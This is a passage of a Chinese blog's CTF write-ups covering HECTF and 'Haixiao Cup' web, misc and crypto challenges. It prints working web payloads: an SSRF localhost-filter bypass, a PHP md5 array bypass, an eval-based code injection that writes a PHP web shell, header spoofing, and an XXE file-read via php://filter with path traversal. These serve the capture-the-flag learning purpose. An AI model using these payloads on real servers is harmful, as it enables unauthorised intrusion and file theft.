punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'url fomat error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token variable">$hostname</span><span class="token operator">=</span><span class="token variable">$url_parse</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token variable">$ip</span><span class="token operator">=</span><span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$hostname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$int_ip</span><span class="token operator">=</span><span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'127.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">>></span><span class="token number">24</span> <span class="token operator">||</span> <span class="token class-name">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'10.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">>></span><span class="token number">24</span> <span class="token operator">||</span> <span class="token class-name">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'172.16.0.0'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">20</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">>></span><span class="token number">20</span> <span class="token operator">||</span> <span class="token class-name">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'192.168.0.0'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">16</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考：<a href="https://www.getflag.cn/2020/10/22/%E6%B5%85%E8%B0%88ssrf%E4%B8%8Ectf%E9%82%A3%E4%BA%9B%E4%BA%8B/">【转载】浅谈ssrf与ctf那些事 | kawhi’s Blog (getflag.cn)</a></p><p><img src="https://s3.ax1x.com/2020/11/21/D3w5a8.png"></p><pre class="line-numbers language-none"><code class="language-none">?url&#x3D;http:&#x2F;&#x2F;[0:0:0:0:0:ffff:127.0.0.1]&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s3.ax1x.com/2020/11/21/D3w7GQ.png"></p><br><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="【真签到题】快来看直播啦"><a href="#【真签到题】快来看直播啦" class="headerlink" title="【真签到题】快来看直播啦~"></a>【真签到题】快来看直播啦~</h3><p>题目：前往直播间，<del>调戏小蓝蓝</del>获取flag。</p><p>flag在直播屏幕里</p><pre class="line-numbers language-none"><code class="language-none">HECTF&#123;狮虎萌轻一点打出题人好吗嘤嘤嘤&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="png"><a href="#png" class="headerlink" title="png"></a>png</h3><p>题目：好可爱的小猫咪鸭~</p><p>下载后是一张图片：<code>flag.png</code></p><p>拖到010 Editor里，在末尾发现这个</p><p><img src="https://s3.ax1x.com/2020/11/22/D8bYa6.png"></p><pre class="line-numbers language-none"><code class="language-none">M2I3OWJkZjhmY2ZkNTVmZH0&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base64解密后得到</p><pre class="line-numbers language-none"><code class="language-none">3b79bdf8fcfd55fd&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>差了前半段，尝试调整图片高度，将<code>02 BC</code>改为<code>04 20</code></p><p><img src="https://s3.ax1x.com/2020/11/22/D8bILn.png"></p><p>在图片最下看到前半段的flag</p><p><img src="https://s3.ax1x.com/2020/11/22/D8qy6J.png"></p><p>合起来得到flag</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;94ed7fdae8f504743b79bdf8fcfd55fd&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="不说人话"><a href="#不说人话" class="headerlink" title="不说人话"></a>不说人话</h3><p>题目：阴阳怪气？！</p><p>使用<a href="https://www.splitbrain.org/services/ook">Ook编解码在线工具</a>，得到flag</p><p><img src="https://s3.ax1x.com/2020/11/22/D8OrL9.png"></p><pre class="line-numbers language-none"><code class="language-none">HECTF&#123;TH1s_1s_crypt0_914nda0&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>参考：<a href="https://mp.weixin.qq.com/s/SWjgzRRm8-RKCRRSrLYbRw">https://mp.weixin.qq.com/s/SWjgzRRm8-RKCRRSrLYbRw</a></p><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>题目：Sunned是一个linux小白，突然有一天想学渗透，她请教了某大佬，大佬说，首先的你得先学会搭建环境，然后，然后，Sunned就跟着网上的教程先搭建了一个web服务器，搭建好之后大佬给她上了一个题目。</p><p>hint：一个小姑娘走丢了，她的家人担心地到处找，一边找一边喊：贝丝！你在哪？？ L2V0Yy9jcm9udGFi</p><p>查看源码发现</p><p><img src="https://s3.ax1x.com/2020/11/21/D3wXq0.png"></p><p>php弱类型比较问题，利用md5不能加密数组绕过</p><pre class="line-numbers language-none"><code class="language-none">a[]&#x3D;1&amp;b[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到：</p><pre class="line-numbers language-none"><code class="language-none">You need the file is .&#x2F;3b8cf4731c36d20776c76e20f9c774c7.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问该路径</p><p><img src="https://s3.ax1x.com/2020/11/22/D30ks1.png"></p><pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;@$data&#x3D;$_POST[&#39;data&#39;];$file&#x3D;$_POST[&#39;file&#39;];if($file!&#x3D;&quot;&#x2F;xxx&quot;)die(&quot;你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径&quot;);if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $data)) &#123;echo &quot;great!!!!你需要看看源码&quot;;file_put_contents($file,&quot;&quot;);&#125;你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据提示的<code>L2V0Yy9jcm9udGFi</code>，进行base64解码，得到</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;crontab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问该路径</p><p><img src="https://s3.ax1x.com/2020/11/22/D30ZdK.png"></p><p>尝试传参，并访问</p><pre class="line-numbers language-none"><code class="language-none">data&#x3D;phpinfo();&amp;file&#x3D;&#x2F;very_g00d_Y0u_got_it.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s3.ax1x.com/2020/11/22/D30GeP.png"></p><p>get_defined_vars() 会返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">get_defined_vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*array(4) &#123;  ["_GET"]=>  array(0) &#123;  &#125;  ["_POST"]=>  array(0) &#123;  &#125;  ["_COOKIE"]=>  array(0) &#123;  &#125;  ["_FILES"]=>  array(0) &#123;  &#125;&#125;*/</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">data&#x3D;eval(pos(next(get_defined_vars())));&amp;file&#x3D;&#x2F;very_g00d_Y0u_got_it.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>或：</p><p>data=eval(end(current(get_defined_vars())));&amp;file=/very_g00d_Y0u_got_it.php</p></blockquote><p><img src="https://s3.ax1x.com/2020/11/22/D8fMgx.png"></p><p><img src="https://s3.ax1x.com/2020/11/24/DUeG5R.png"></p><p>执行命令</p><p><img src="https://s3.ax1x.com/2020/11/24/DUmKJI.png"></p><blockquote><p><code>Zmw0Z2dnZ2dnZ2dnZ2dnCg</code> base64解密后为 <code>fl4ggggggggggggCg</code></p><p>也可以读取<code>3b8cf4731c36d20776c76e20f9c774c7.php</code>，从注释知道flag所在文件</p></blockquote><p>读取<code>Zmw0Z2dnZ2dnZ2dnZ2dnCg</code>，得到flag</p><p><img src="https://s3.ax1x.com/2020/11/24/DUm6w4.png"></p><ul><li><code>3b8cf4731c36d20776c76e20f9c774c7.php</code></li></ul><p>源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>@$data=$_POST['data'];$file=$_POST['file'];if($file!="/xxx")die("你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径");if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $data)) &#123;echo "great!!!!你需要看看源码";file_put_contents($file,"<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token string double-quoted-string">".\$data."</span> <span class="token delimiter important">?></span></span>");&#125;<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>@<span class="token variable">$data</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">!=</span><span class="token string double-quoted-string">"/very_g00d_Y0u_got_it.php"</span><span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonono "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"great!!!!"</span><span class="token punctuation">;</span>    @<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;?php "</span><span class="token operator">.</span><span class="token variable">$data</span><span class="token operator">.</span><span class="token string double-quoted-string">" ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//你想要的文件是   Zmw0Z2dnZ2dnZ2dnZ2dnCg</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h3 id="在这里签到"><a href="#在这里签到" class="headerlink" title="在这里签到"></a>在这里签到</h3><p>题目：经典套娃 有手就…</p><ul><li>enc.txt</li></ul><pre class="line-numbers language-none"><code class="language-none">U2FsdGVkX18DxoLgtTzVee++9JZw790ngjGfxdjjjeWt9m9jL2O3NJuKB&#x2F;&#x2F;4O3BHTnelg2z+o2vE0AxVKPobIFVgKxqbpkr94XYPNZFbbFykHWBMArdVT8FuH7dyvHDrLe7D35p654UEy2Yn0FepbJ7BHcn9Gu9xg7eqVcovB6KfMivcXw49JyZWbWtb0SZKpA0hRgI2tNeQ8lsRZRkoaI9CECyphItxLd0bO58phQjv70M&#x2F;e30tsFpEmPo&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>rabbit解密</p><pre class="line-numbers language-none"><code class="language-none">R1E0RElOSlVHTTJUSU5CV0c1QkRHTkJUR01aVFFOUlRHWTJER05SVEdVWlRJTlJVR1laVEdPQlRHVTNES05SVkdZWlRHTkpUR0kzREdOUlZHWTJETU1KV0dJWlRJTVpaR1kyREdNWldHUVpURU5SV0dNM1RNTkpXR0UzVUk9PT0&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base64解密</p><pre class="line-numbers language-none"><code class="language-none">GQ4DINJUGM2TINBWG5BDGNBTGMZTQNRTGY2DGNRTGUZTINRUGYZTGOBTGU3DKNRVGYZTGNJTGI3DGNRVGY2DMMJWGIZTIMZZGY2DGMZWGQZTENRWGM3TMNJWGE3UI&#x3D;&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base32解密</p><pre class="line-numbers language-none"><code class="language-none">48454354467B34333863643635346463383565656335326365646162343964336432663765617D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>十六进制转字符串</p><pre class="line-numbers language-none"><code class="language-none">HECTF&#123;438cd654dc85eec52cedab49d3d2f7ea&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h3><p>题目：RRRRRRRSSSSSSSSAAAAAAA~~~~~~~</p><ul><li>rsa.txt</li></ul><pre class="line-numbers language-none"><code class="language-none">n &#x3D; 11419768903339716189261532371559705252086398275876008505047375123074727093589680611869748263351554093957968142343831331654606932684767042958427409579115435445187908134556329979271179879129295667476493886787230948520371350715808988496083694717544298343260369816980228394498856751096191942011545898984240281874509791880690092840536597771674772617299407710771426964764347566008897012753022763270832647775571317162594044338095870404550665457899223394942640876850692848671826594750236910363027949459768124646230555766323417693441861436560072288812137944884954974348317322412816157152702695143094487806945533233359294549423e &#x3D; 65537c &#x3D; 575061710950381118206735073806398116370706587076775765253483131078316908073202143802386128272374323616239083134747318254436706806781744501903333604772961927966747648954315962269321297121495398057938617145017999482722197661065698707836824505023856306403892307944203245563411961302499347604417024064678999003637933185177922884103362203639349298263339808508185861692596967147081382566246627668898774233029198694500565511361867375668367875805985660705137109665107860799277624050210666866958502948062330037309873148963011192405012811945540153592090345668265964477204465327474208098404082920129178960510763496025906621820<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>首先分解p、q，使用<a href="http://factordb.com/%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86">http://factordb.com/在线解密</a></p><p><img src="https://s3.ax1x.com/2020/11/25/DUnK74.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2n <span class="token operator">=</span> <span class="token number">11419768903339716189261532371559705252086398275876008505047375123074727093589680611869748263351554093957968142343831331654606932684767042958427409579115435445187908134556329979271179879129295667476493886787230948520371350715808988496083694717544298343260369816980228394498856751096191942011545898984240281874509791880690092840536597771674772617299407710771426964764347566008897012753022763270832647775571317162594044338095870404550665457899223394942640876850692848671826594750236910363027949459768124646230555766323417693441861436560072288812137944884954974348317322412816157152702695143094487806945533233359294549423</span>e <span class="token operator">=</span> <span class="token number">65537</span>c <span class="token operator">=</span> <span class="token number">575061710950381118206735073806398116370706587076775765253483131078316908073202143802386128272374323616239083134747318254436706806781744501903333604772961927966747648954315962269321297121495398057938617145017999482722197661065698707836824505023856306403892307944203245563411961302499347604417024064678999003637933185177922884103362203639349298263339808508185861692596967147081382566246627668898774233029198694500565511361867375668367875805985660705137109665107860799277624050210666866958502948062330037309873148963011192405012811945540153592090345668265964477204465327474208098404082920129178960510763496025906621820</span>p <span class="token operator">=</span> <span class="token number">2499568793</span>q <span class="token operator">=</span> <span class="token number">4568695582742345507136251229217400959960856046691733722988345503429689799935696593516299458516865110324638359470761456115925725067558499862591063153473862179550706262380644940013531317571260647226561004191266100720745936563550699000939117068559232225644277283541933064331891245169739139886735615435506152070330233107807124410892978280063993668726927377177983100529270996547002022341628251905780873531481682713820809147098305289391835297208890779643623465917824350382592808578978330348769060448006691307027594085634520759293965723855183484366752511654099121387261343686017189426761536281948007104498017003911</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">flag&#123;8fb873baba0df4a6423be9f4bd525d93&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="no-blank-space"><a href="#no-blank-space" class="headerlink" title="no blank space"></a>no blank space</h3><p>题目：出题人的电脑年久失修，空格键失灵了，你能找到电报里的秘密吗(注:flag内字母全部大写）   flag格式：HECTF{.+}</p><p>hint：试试别的电报码叭</p><p>hint：古老的5bit编码</p><ul><li>cipher.txt</li></ul><pre class="line-numbers language-none"><code class="language-none">.-.------.-...-.-----..-..----.-.--..-...-........--.-...-...-........--.-.-..--.----...--..-...-..-.....-.-.---.-...-..----.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://blog.by24.cn/archives/character-encoding-baudot-code.html"><strong>博多码</strong></a></p><p>将<code>.</code>换成<code>1</code>，<code>-</code>换成<code>0</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'.-.------.-...-.-----..-..----.-.--..-...-........--.-...-...-........--.-.-..--.----...--..-...-..-.....-.-.---.-...-..----.'</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'-'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">10100000010111010000011011000010100110111011111111001011101110111111110010101100100001110011011101101111101010001011101100001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用这个网站解码：<a href="https://www.boxentriq.com/code-breaking/baudot-code">Baudot Code, Baudot-Murray Code (online tool) | Boxentriq</a></p><p><img src="https://s3.ax1x.com/2020/11/26/D0J7Sf.png"></p><pre class="line-numbers language-none"><code class="language-none">HECTFTH1S1SNTM0RS3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>整理下得到flag</p><pre class="line-numbers language-none"><code class="language-none">HECTF&#123;TH1S1SNTM0RS3&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以一个一个对照解码</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/SywnzjKe8U58SVCRVHoDacZsHKyhtVKIcBasicyaIaYo0q5iafPeclgtZQeKAcHwaibLQHOwibWOiaT1J0saevG7acg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p><pre class="line-numbers language-none"><code class="language-none">10100H00001E01110C10000T01101F10000T10100H11011切换到数字10111111111切换到字母00101S11011切换到数字10111111111切换到字母00101S01100N10000T11100M11011切换到数字10110011111切换到字母01010R00101S11011切换到数字000013<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三届海啸杯 write up</title>
      <link href="posts/20201119.html"/>
      <url>posts/20201119.html</url>
      
        <content type="html"><![CDATA[<p>web &amp; misc &amp; crypto</p><span id="more"></span><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="G2mtu学生"><a href="#G2mtu学生" class="headerlink" title="G2mtu学生?"></a>G2mtu学生?</h3><p><strong>X-Forwarded-For绕过、Cookie伪造</strong></p><p>用Burp Suite抓包，将<code>user=0</code>改为<code>user=1</code>，添加X-Forwarded-For:127.0.0.1</p><p><img src="https://s3.ax1x.com/2020/11/19/DunHr8.png"></p><br><h3 id="Who-are-you？"><a href="#Who-are-you？" class="headerlink" title="Who are you？"></a>Who are you？</h3><p>用Burp suite抓包，发现</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;feedback&gt;&lt;author&gt;aaa&lt;&#x2F;author&gt;&lt;&#x2F;feedback&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>好像是XXE漏洞，在书上查看攻击方式</p><p><img src="https://s3.ax1x.com/2020/11/19/DuuoFJ.jpg"></p><p>尝试用php伪协议读取flag.php</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY b SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot; &gt;]&gt;&lt;xml&gt;&lt;xxe&gt;&amp;b;&lt;&#x2F;xxe&gt;&lt;&#x2F;xml&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现读不出来，跳转到根目录下读取也不行</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>尝试读取index.php，读取成功，得到</p><pre class="line-numbers language-none"><code class="language-none">PD9waHANCmxpYnhtbF9kaXNhYmxlX2VudGl0eV9sb2FkZXIoZmFsc2UpOw0KJGRhdGEgPSBAZmlsZV9nZXRfY29udGVudHMoJ3BocDovL2lucHV0Jyk7DQokcmVzcCA9ICcnOw0KLy8kZmxhZz0nZmxhZ3s3OWQxMDYyNi1kMjdmLTQ1NjktYTYyOS1jOTYwNmQwMzc4ZjJ9JzsNCmlmKCRkYXRhICE9IGZhbHNlKXsNCiAgICAkZG9tID0gbmV3IERPTURvY3VtZW50KCk7DQogICAgJGRvbS0+bG9hZFhNTCgkZGF0YSwgTElCWE1MX05PRU5UKTsNCiAgICBvYl9zdGFydCgpOw0KICAgICRyZXMgID0gJGRvbS0+dGV4dENvbnRlbnQ7DQogICAgJHJlc3AgPSBvYl9nZXRfY29udGVudHMoKTsNCiAgICBvYl9lbmRfY2xlYW4oKTsNCiAgICBpZiAoJHJlcyl7DQogICAgICAgIGRpZSgkcmVzKTsNCiAgICB9DQoNCn0NCj8+DQo8IURPQ1RZUEUgaHRtbD4NCjxodG1sIGxhbmc9ImVuIj4NCjxoZWFkPg0KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4NCiAgICA8dGl0bGU+d2VsY29tZTwvdGl0bGU+DQogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIuL3N0eWxlLmNzcyI+DQogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPg0KICAgIDxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29tcGF0aWJsZSIgY29udGVudD0iaWU9ZWRnZSI+DQoNCjwvaGVhZD4NCjxib2R5IGNsYXNzPSJjb250YWN0Qm9keSI+DQo8ZGl2IGNsYXNzPSJ3cmFwcGVyIj4NCiAgICA8ZGl2IGNsYXNzPSJ0aXRsZSI+DQoNCg0KICAgIDwvZGl2Pg0KDQoNCiAgICA8Zm9ybSBtZXRob2Q9InBvc3QiIGNsYXNzPSJmb3JtIj4NCiAgICAgICAgPGgxIGlkPSJ0aXRsZSI+6K+36L6T5YWl5aeT5ZCNPC9oMT4NCiAgICAgICAgPGJyLz4NCiAgICAgICAgPGJyLz4NCiAgICAgICAgPGJyLz4NCiAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJuYW1lIGVudHJ5ICIgaWQ9Im5hbWUiIG5hbWU9Im5hbWUiIHBsYWNlaG9sZGVyPSJZb3VyIE5hbWUiLz4NCiAgICA8L2Zvcm0+DQogICAgPGJ1dHRvbiBjbGFzcz0ic3VibWl0IGVudHJ5IiBvbmNsaWNrPSJmdW5jKCkiPlN1Ym1pdDwvYnV0dG9uPg0KDQogICAgPGRpdiBjbGFzcz0ic2hhZG93Ij48L2Rpdj4NCjwvZGl2Pg0KDQo8L2JvZHk+DQo8L2h0bWw+DQo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+DQogICAgZnVuY3Rpb24gcGxheSgpIHsNCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCiAgICBmdW5jdGlvbiBmdW5jKCkgew0KICAgICAgICAvLyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgpLnZhbHVlDQogICAgICAgIHZhciB4bWwgPSAnJyArDQogICAgICAgICAgICAnPFw&#x2F;eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ilw&#x2F;PicgKw0KICAgICAgICAgICAgJzxmZWVkYmFjaz4nICsNCiAgICAgICAgICAgICc8YXV0aG9yPicgKyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbmFtZScpLnZhbHVlKyAnPC9hdXRob3I+JyArDQogICAgICAgICAgICAnPC9mZWVkYmFjaz4nOw0KICAgICAgICBjb25zb2xlLmxvZyh